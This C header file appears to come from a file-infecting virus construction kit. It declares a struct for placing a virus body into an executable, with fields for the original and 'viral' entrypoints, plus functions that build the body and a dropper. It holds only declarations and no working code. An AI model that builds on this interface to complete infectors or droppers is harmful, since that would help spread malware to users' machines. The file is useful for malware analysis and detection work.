
#ifndef __TEST_HPP__
#define __TEST_HPP__

#pragma pack(push)
#pragma pack(1)

#define EV_MAKEBODY_MORPH       0x9EFEF93B

#define FL_MBI_SAVEREGS         0x00000001
#define FL_MBI_RET0C            0x00000002

struct makebody_info
{
BYTE*   mbi_vir_ptr;              // ptr to block containing vir        OUT
DWORD   mbi_vir_size;             // vir size                           OUT
DWORD   mbi_vir_virtrva;          // RVA of virus in file               IN
DWORD   mbi_vir_origentry;        // RVA of original entrypoint         IN
DWORD   mbi_vir_currentry;        // viral entrypoint (rel. to virtrva) IN/OUT
DWORD   mbi_flags;                // FL_MBI_xxx
DWORD   mbi_datom;                // dropper's atom
DWORD   mbi_dsubsys;              // dropper's subsys, GUI/CUI
};

int  __cdecl build_body   (struct makebody_info*);
int  __cdecl build_dropper(struct makebody_info*);
void __cdecl build_free();

#pragma pack(pop)

#endif // __TEST_HPP__

